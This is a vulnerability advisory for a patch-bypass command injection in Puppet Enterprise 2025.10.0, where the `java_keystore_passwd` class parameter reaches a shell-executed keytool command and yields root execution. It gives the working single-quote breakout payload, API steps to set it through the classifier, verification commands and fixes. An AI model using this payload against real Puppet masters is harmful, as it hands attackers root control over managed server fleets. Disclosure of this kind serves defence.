# Puppet Enterprise 2025.10.0 — CVE-2025-5459 Patch-Bypass Variant → keytool Shell Injection → Root RCE

## 1. Overview

Puppet Enterprise (PE) is the commercial configuration-management platform from Puppet (Perforce), used to manage fleets of servers, network devices, and endpoints. This advisory covers an unpatched command-injection variant in PE 2025.10.0 — a version that already shipped the fix for CVE-2025-5459. That CVE (CWE-78, CVSS 8.8, fixed in 2025.4.0) described a user with node-group editing permissions crafting a class parameter to execute commands as root on the primary host. The vendor's patch added sanitization to the `code_management` module parameters in `code_management.pp` (`pe_validate_absolute_path()` plus `Sensitive()`), but **missed** `java_keystore_passwd` in `master.pp` — the same shell-executed `keytool` pattern, with no validation and no `Sensitive()` wrapping.

An admin attacker sets `java_keystore_passwd` on the `puppet_enterprise::profile::master` class through the classifier API, provides a `trusted_infra_cacert` to arm the `pe_java_keytool_import` exec, and triggers a puppet agent run. The exec command is a Puppet String (executed via `/bin/sh -c`) with the password wrapped only in single quotes — a single-quote breakout and semicolon inject arbitrary commands executed as root (the master puppet agent runs as root by default). Verified end-to-end: the injected `id` command created a marker file owned by `uid=0(root)`.

## 2. Vulnerability Summary

- **Type**: Authenticated OS command injection → root RCE (patch-bypass variant of CVE-2025-5459)
- **Root cause 1 (CWE-78)**: `master.pp:770-777` defines an `exec` resource whose `command` is a String (shell-parsed via `/bin/sh -c`) containing `-storepass '${java_keystore_passwd}'` with no escaping; a single-quote breakout plus semicolon injects arbitrary commands
- **Root cause 2 (CWE-20/CWE-269)**: `$java_keystore_passwd` (`master.pp:92`) is declared with no validation (`pe_validate_absolute_path()`) and no `Sensitive()`; the master puppet agent runs as root
- **Patch gap**: CVE-2025-5459's fix (2025.4.0) sanitized `code_management.pp` parameters but not the same-family `master.pp` parameter
- **Result**: admin → root RCE on the PE master. CVSS 8.8.

## 3. Authentication Boundary

PE 2025.10.0 (monolithic install: master + console + puppetdb + postgresql on one host) exposes:

| Port | Service | Auth |
|---|---|---|
| 443 | pe-nginx (reverse proxy → 4430) | TLS; app-level auth |
| 4433 | console-services SSL (public) | RBAC token (`X-Authentication`) |
| 8140 | puppetserver | client-cert auth |
| 8170 | code-manager | RBAC token |
| 8143 | orchestrator HTTP API | RBAC token |

Authentication uses opaque RBAC tokens (256-bit SecureRandom, PBKDF2WithHmacSHA1 10000 iterations, DB lookup) obtained via `POST /rbac-api/v1/auth/token` with `{"login":"admin","password":"<pwd>"}`. Every business API (classifier, code-manager, orchestrator, RBAC) requires `X-Authentication: <token>`. The Clojure middleware stack (`wrap-block-anonymous-access`, the global gate) enforces authentication on all business endpoints. The attack requires an admin token and PE Master node-group edit rights, both of which the default super-admin has.

## 4. Attack Surface

- **Entry**: `POST /classifier-api/v1/groups/<PE Master group id>` with `X-Authentication: <admin token>`
- **Controllable parameters**: `classes.puppet_enterprise::profile::master.java_keystore_passwd` (the injection vector) and `trusted_infra_cacert` (the arming condition)
- **Trigger**: the master node's next puppet agent run (default every 30 minutes, or manual `puppet agent -t`)
- **Privilege**: the master puppet agent runs as root — injected commands inherit uid 0
- **Default configuration**: unvalidated `java_keystore_passwd`, root agent, admin-controllable classifier API — no non-default config required

## 5. Sink Identification

The sink is the `pe_java_keytool_import` exec resource in `master.pp`:

```puppet
# master.pp:92 — class parameter declaration (no validation/escaping)
$java_keystore_passwd = $::puppet_enterprise::profile::master::java_keystore_passwd,
#   ↑ String, default 'changeit', no pe_validate_absolute_path(), no Sensitive()

# master.pp:770-777 — pe_java_keytool_import exec resource (shell execution)
exec { 'pe_java_keytool_import':
  command => "keytool -importcert -noprompt -storepass '${java_keystore_passwd}' \
              -file ${trusted_cacert_path} -alias pe-trusted-infra-cacert -keystore ${cacerts_path}",
  onlyif  => "test -f ${trusted_cacert_path}",
  unless  => "keytool -list -cacerts -alias pe-trusted-infra-cacert",
  path    => ['/opt/puppetlabs/server/data/puppetserver/jruby-gems/bin', ...],
}
```

The `command` is a **String**, not an Array — Puppet exec semantics run String commands through `/bin/sh -c` (shell parsing). `java_keystore_passwd` is inserted inside single quotes with no escaping, enabling single-quote breakout plus semicolon-separated command injection.

## 6. Source Identification & Controllability

The source is the classifier API: `POST /classifier-api/v1/groups/<PE Master group id>` accepts a JSON body whose `classes.puppet_enterprise::profile::master` map can set arbitrary class parameters. The classifier performs a params-level merge (omitted keys are retained; JSON `null` deletes). The `puppet_enterprise::profile::master` class is assigned to the built-in **PE Master** node-group (name "PE Master"), so the parameters apply to the master node on the next agent run. Both the injection payload (`java_keystore_passwd`) and the arming condition (`trusted_infra_cacert`) are fully attacker-controlled.

## 7. Data Flow

```
admin token (X-Authentication)
    │
    ▼
POST /classifier-api/v1/groups/<PE Master group id>
  (classes.puppet_enterprise::profile::master.java_keystore_passwd = <payload>)
    │
    ▼
classifier DB merge → PE Master group params updated
    │
    ▼
master node puppet agent run (as root)
    │
    ▼
catalog compiled → puppet_enterprise::profile::master class applied
    │
    ▼
master.pp:92  $java_keystore_passwd = <payload>  (no validation)
    │
    ▼
master.pp:770-777  exec pe_java_keytool_import:
    command = "keytool -importcert -storepass '<payload>' ..."
    │
    ▼
/bin/sh -c "keytool -importcert -storepass '<payload>' ..."  (shell parsing)
    │
    ▼
single-quote breakout + semicolon → injected command runs as root
```

## 8. Exploit Construction

Payload structure:

```
java_keystore_passwd = x'; LC_ALL=C id > /tmp/pe_rce_vuln001_marker 2>&1; echo 'y
```

- `x'` closes the single quote in `-storepass 'x'`
- `; LC_ALL=C <CMD> > /tmp/... ;` semicolon-separated injected command (`LC_ALL=C` forces English stdout, avoiding locale-dependent `id` output)
- `echo 'y` reopens a single quote to balance the trailing `'` and avoid a shell syntax error

The resulting shell execution:

```sh
/bin/sh -c "keytool -importcert -noprompt -storepass 'x'; LC_ALL=C id > /tmp/pe_rce_vuln001_marker 2>&1; echo 'y' -file /opt/.../pe-trusted-infra-cacert.pem -alias pe-trusted-infra-cacert -keystore /opt/.../cacerts"
```

The shell splits on semicolons; `keytool` fails on the malformed arguments, but the injected `LC_ALL=C id` still executes and writes the marker.

## 9. Dynamic Verification

1. Obtain admin token: `POST /rbac-api/v1/auth/token` → `200 OK`, 44-char token.
2. Discover the PE Master group: `GET /classifier-api/v1/groups` → `name=PE Master`, `id=<group-id>`.
3. Inject: `POST /classifier-api/v1/groups/<id>` with `java_keystore_passwd` payload + dummy `trusted_infra_cacert` → `200 OK` (params merge).
4. Trigger: `/opt/puppetlabs/bin/puppet agent -t --detailed-exitcodes` → exit code 6 (changes + failures, expected — the keytool command fails on the injected break, but the injected `id` already ran).
5. Verify:

```
ls -l /tmp/pe_rce_vuln001_marker          # marker exists
stat -c '%U (uid=%u)' /tmp/pe_rce_vuln001_marker   # owner = root (uid=0)
cat /tmp/pe_rce_vuln001_marker            # uid=0(root) gid=0(root) groups=0(root)
```

6. Restore parameters (set both to JSON `null`) → `204 No Content`.

## 10. Reachability & Impact

- **Reachability**: requires only an admin RBAC token (obtainable over the network via the token endpoint) and node-group edit rights — both default for the super-admin. The sink runs automatically on the next agent run (default 30-minute interval or manual trigger). No non-default configuration is needed.
- **Impact**: root command execution on the PE master — the control plane of the entire managed fleet. Catalogs, certificates, secrets, managed-node state, and orchestration are all under attacker control; this is a full compromise of the configuration-management server.
- **Scope**: PE deployments on versions where `java_keystore_passwd` remains unvalidated (2025.10.0 verified; earlier versions affected too).

## 11. Fix Recommendations

1. Apply the same sanitization used for `code_management` parameters to `java_keystore_passwd`: `pe_validate_absolute_path()` + `Sensitive()`, or switch the exec to Array-form (no shell parsing)
2. Uniformly sanitize all shell-executed `keytool` exec resources in `master.pp`, not just the `code_management` module
3. Wrap sensitive parameters with `Sensitive()` so values never appear in catalogs/reports and cannot be interpolated into shell commands
4. Restrict node-group editing to least-privilege roles; audit all classifier class-parameter changes for anomalous payloads
5. Consider running the master agent non-root to limit the blast radius

## 12. CWE & CVSS

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command — single-quote breakout in the `keytool` command
- **CWE-20**: Improper Input Validation — unvalidated class parameter
- **CWE-269**: Improper Privilege Management — agent runs as root
- **CVSS**: 8.8 High — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
